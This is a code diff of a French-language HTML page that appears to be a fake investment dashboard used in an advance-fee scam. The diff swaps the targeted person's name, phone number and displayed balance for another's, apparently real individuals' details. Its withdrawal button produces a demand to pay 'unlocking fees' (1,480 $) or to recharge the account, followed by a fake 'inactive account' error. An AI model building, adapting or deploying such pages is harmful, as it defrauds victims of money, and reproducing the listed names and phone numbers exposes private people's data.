@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "818138013") {
+        if (code === "0971621766") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 13 833 $</span>
+                <span class="balance">Solde: 1 425 $</span>
                 <div class="account-info">
-                    <span id="user-name"> TUMBA KABONGO GENEVIEVE </span><br>
-                    <span id="user-phone"> 243 818 138 013</span>
+                    <span id="user-name"> Genêt-Rose Boboyo </span><br>
+                    <span id="user-phone"> 243 09 71 62 17 66</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Vodacom</button>
+                <button id="orange-money">Retirer via Airtel Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "TUMBA KABONGO GENEVIEVE";
-                const accountNumber = "243 818 138 013";
-                const balance = "13 833 $";
+                const accountName = "Genêt-Rose Boboyo";
+                const accountNumber = "243 09 71 62 17 66";
+                const balance = " 1 425 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Vodacom ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Vodacom");
+                    setWithdrawalInfo("Airtel");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Tumba, veuillez payer les frais de déblocage de 1 480 $ afin de recevoir vos bénéfices immediatement.');
+                alert('Cher Genêt, veuillez recharger votre compte afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : compte inactif.';
